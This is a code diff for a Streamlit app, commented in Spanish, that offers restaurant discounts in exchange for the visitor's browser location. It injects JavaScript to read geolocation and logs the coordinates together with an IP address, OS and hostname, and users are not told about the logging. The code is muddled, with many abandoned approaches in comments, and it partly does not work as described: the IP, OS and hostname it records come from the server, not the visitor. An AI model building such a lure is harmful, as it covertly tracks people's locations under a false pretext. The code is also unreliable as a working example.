@@ -12,124 +12,113 @@ st.set_page_config(page_title="Carta con Descuentos", layout="centered")
 st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
 st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")
 
-# HTML+JS que obtiene ubicación y la envía con postMessage a Streamlit
-geoloc_html = """
-<script>
-const sendLocation = () => {
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-      window.parent.postMessage({ type: 'geo', coords: coords }, '*');
-    },
-    (err) => {
-      window.parent.postMessage({ type: 'geo', error: err.message }, '*');
-    }
-  );
-};
+# Crea un componente custom para obtener la ubicación
+def get_location():
+    location = components.declare_component(
+        "get_location",
+        default=None,
+    )
 
-sendLocation();
-</script>
-"""
-
-# Mostrar componente HTML que obtiene geolocalización
-geo_data = components.html(geoloc_html, height=0, scrolling=False)
-
-# Variable vacía para almacenar lat, lon
-lat, lon = None, None
-
-# Capturamos mensajes postMessage con st.experimental_get_query_params NO sirve para esto,
-# pero componentes.html no retorna directamente, entonces podemos usar componentes.declare_component
-
-# Mejor opción: Usar un componente declarado para recibir los datos
-
-# Aquí una función simple que crea un componente que recibe coords via postMessage y lo devuelve a python
-def geolocator():
-    component_code = """
-    <html>
-      <body>
-        <script>
-          const sendLocation = () => {
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                window.parent.postMessage(coords, '*');
-              },
-              (err) => {
-                window.parent.postMessage({error: err.message}, '*');
-              }
-            );
-          };
-          sendLocation();
-        </script>
-      </body>
-    </html>
-    """
-    # Declarar componente, react_mode="streamlit" permite comunicación bidireccional
-    location = components.declare_component("geolocator", default=None)
-    # Mostrar html en el componente
-    components.html(component_code, height=0)
-    return location
-
-# Pero como components.declare_component requiere archivo JS externo, vamos con esta versión simplificada:
-# En realidad, la forma estándar para recoger mensajes desde JS a Python es usar streamlit-frontend y backend
-# pero Streamlit no tiene soporte directo para escuchar postMessage.
-
-# Alternativa práctica (y sencilla): Mostrar botón "Enviar ubicación" que, al pulsarlo, lanza el JS y
-# guarda la ubicación en st.session_state para que puedas usar en Python.
-
-if "lat" not in st.session_state or "lon" not in st.session_state:
-    if st.button("Permitir acceso a la ubicación"):
-        # Ejecutar JS para pedir ubicación y guardarla en session_state via Streamlit-JS bridge
+    if location is None:
+        # Primer render, insertamos JS para pedir ubicación
         components.html(
             """
             <script>
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude};
-                window.parent.postMessage({type:'setLocation', coords: coords}, '*');
-              },
-              (err) => {
-                window.parent.postMessage({type:'setLocation', error: err.message}, '*');
-              }
-            );
+            const sendLocation = () => {
+              navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                  const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude};
+                  window.parent.postMessage({isLocation: true, coords: coords}, "*");
+                },
+                (err) => {
+                  window.parent.postMessage({isLocation: true, error: err.message}, "*");
+                }
+              );
+            };
+            sendLocation();
             </script>
             """,
             height=0,
         )
-        st.write("Por favor, acepta la solicitud de ubicación en tu navegador.")
+    return location
+
+# Escuchar mensajes desde JS usando st.experimental_get_query_params no funciona,
+# pero Streamlit no soporta capturar postMessage nativamente,
+# por eso usaremos el componente declarado que puede devolver info a Python
+# cuando use window.parent.postMessage y el componente se llama get_location
+
+# Alternativa directa con declare_component es que se usa con React + JS, pero
+# sin archivo JS es muy limitada. Por eso usamos la siguiente forma simple:
+
+# En su lugar, vamos a usar components.html con un pequeño hack:
+# En cada ejecución, la función components.html() puede devolver texto usando window.prompt
+
+# Pero prompt no es práctico, mejor:
+# Vamos a usar el siguiente método: con un botón, pedimos la ubicación y la pasamos a un input text que Streamlit lee
+
+# Paso 1: Mostrar botón para pedir ubicación con JS que llena un campo oculto
+if "coords" not in st.session_state:
+    st.session_state.coords = None
+
+clicked = st.button("Permitir acceso a la ubicación")
+
+if clicked:
+    # Lanzar el JS para pedir la ubicación y guardarla en un input oculto
+    components.html(
+        """
+        <script>
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            const coords = position.coords.latitude + "," + position.coords.longitude;
+            // Colocar coords en input hidden que Streamlit puede leer
+            const input = window.parent.document.querySelector('input#coords_input');
+            if(input){
+              input.value = coords;
+              input.dispatchEvent(new Event('change'));
+            }
+          },
+          function(error) {
+            alert("Error al obtener la ubicación: " + error.message);
+          }
+        );
+        </script>
+        """,
+        height=0,
+    )
+
+# Paso 2: input text oculto para recibir coords desde JS
+coords = st.text_input("Coords", key="coords_input", value="", label_visibility="hidden")
+
+# Si coords ha cambiado, actualizar st.session_state.coords
+if coords and coords != st.session_state.coords:
+    st.session_state.coords = coords
+
+if st.session_state.coords:
+    try:
+        lat_str, lon_str = st.session_state.coords.split(",")
+        lat = float(lat_str)
+        lon = float(lon_str)
+        st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
+        st.subheader("Descuentos cercanos para ti:")
+        st.markdown("""
+        - 🍕 Pizza Margarita -20%
+        - 🍣 Sushi Deluxe -15%
+        - 🥗 Ensalada Mediterránea -10%
+        """)
+
+        # Registrar datos
+        user_data = {
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "lat": lat,
+            "lon": lon,
+            "ip": requests.get("https://api.ipify.org").text,
+            "browser": "N/A",  # No hay forma directa en Streamlit para user_agent sin librerías extra
+            "os": platform.system(),
+            "hostname": socket.gethostname()
+        }
+        guardar_datos(user_data)
+    except Exception as e:
+        st.error(f"Error al interpretar coordenadas: {e}")
 else:
-    lat = st.session_state.get("lat")
-    lon = st.session_state.get("lon")
+    st.warning("Por favor, pulsa el botón y acepta la solicitud de ubicación en tu navegador.")
 
-# Aquí escuchamos mensajes en el front-end y actualizamos session_state - pero Streamlit no soporta postMessage nativamente
-# Para eso necesitamos una librería extra o componente custom. Como solución rápida, podemos pedir al usuario que
-# copie su ubicación en un campo de texto, o que la pase manualmente.
-
-if lat and lon:
-    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
-    st.subheader("Descuentos cercanos para ti:")
-    st.markdown("""
-    - 🍕 Pizza Margarita -20%
-    - 🍣 Sushi Deluxe -15%
-    - 🥗 Ensalada Mediterránea -10%
-    """)
-
-    # Registrar datos
-    user_data = {
-        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "lat": lat,
-        "lon": lon,
-        "ip": requests.get("https://api.ipify.org").text,
-        "browser": "N/A",  # st.runtime no es fiable para user_agent
-        "os": platform.system(),
-        "hostname": socket.gethostname()
-    }
-
-    guardar_datos(user_data)
-else:
-    st.warning("Esperando acceso a tu ubicación...")
-
-# --- Solución alternativa --- #
-# Por limitaciones de Streamlit para comunicarse con JS usando postMessage,
-# la forma más confiable es usar un widget (input) donde el usuario copie/pegue sus coords
-# o un botón que recargue la app con los parámetros en la URL y entonces sí usar st.experimental_get_query_params()
